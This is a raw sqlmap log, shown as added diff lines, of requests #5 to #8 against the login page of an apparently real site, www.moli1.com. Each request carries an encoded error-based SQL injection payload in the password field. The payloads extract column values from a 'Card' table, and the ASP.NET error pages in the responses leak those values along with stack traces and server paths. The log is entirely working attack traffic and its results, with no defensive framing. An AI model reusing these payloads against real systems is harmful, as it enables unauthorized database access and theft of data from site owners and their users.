+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%205092%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28time2%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20KNAY&s=false
+
+HTTP response [#5] (500 Internal Server Error):
+Content-length: 8137
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:42 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq08 \xa03 2016 \xa09:55PMqxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq08 \xa03 2016 \xa09:55PMqxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq08 \xa03 2016 \xa09:55PMqxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq08  3 2016  9:55PMqxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq08  3 2016  9:55PMqxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#6]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%202041%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28types%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20xPtQ&s=false
+
+HTTP response [#6] (500 Internal Server Error):
+Content-length: 8032
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:42 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq021qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq021qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq021qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq021qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq021qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#7]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 501
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%202477%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28status%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20OLYA&s=false
+
+HTTP response [#7] (500 Internal Server Error):
+Content-length: 8022
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:44 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq1qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq1qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq1qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq1qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq1qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#8]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 503
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%209855%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28serverID%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20eYLw&s=false
+
+HTTP response [#8] (500 Internal Server Error):
+Content-length: 8022
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:44 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq2qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
